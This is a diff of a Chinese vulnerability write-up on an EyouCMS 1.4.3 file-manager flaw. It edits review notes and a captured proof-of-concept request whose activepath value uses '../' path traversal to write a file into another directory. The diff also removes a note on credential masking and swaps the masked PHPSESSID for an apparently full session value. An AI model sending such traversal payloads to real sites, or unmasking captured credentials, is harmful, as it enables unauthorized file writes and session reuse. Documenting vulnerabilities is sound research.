@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -30,7 +29,7 @@ schema_version: "1"
 
 - **结论使用边界（2）**：源码介绍editFile，PoC调用newfile，需补调用路径映射。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
 
-- **凭据与会话边界（3）**：完整请求含环境会话/XDEBUG残留，标准化时替换；无成功响应文本。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+- **凭据与会话边界（3）**：完整请求含环境会话/XDEBUG残留；无成功响应文本。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。
 
 历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
@@ -117,7 +116,7 @@ Eyoucms 1.4.3
      Origin: http://127.0.0.1
      Connection: close
      Referer: http://127.0.0.1/eyoucms/login.php?m=admin&c=Filemanager&a=newfile&activepath=%3Atemplate%3Aplugins%3Atest&lang=cn
-     Cookie: home_lang=cn; admin_lang=cn; PHPSESSID=h6k********************dt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705
+     Cookie: home_lang=cn; admin_lang=cn; PHPSESSID=h6k34lgf1svcatllongehqqdt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705
      Upgrade-Insecure-Requests: 1
 
      activepath=%2Ftemplate%2Fplugins%2Ftest/../../../uploads/tmp&filename=newfile.htm&content=test
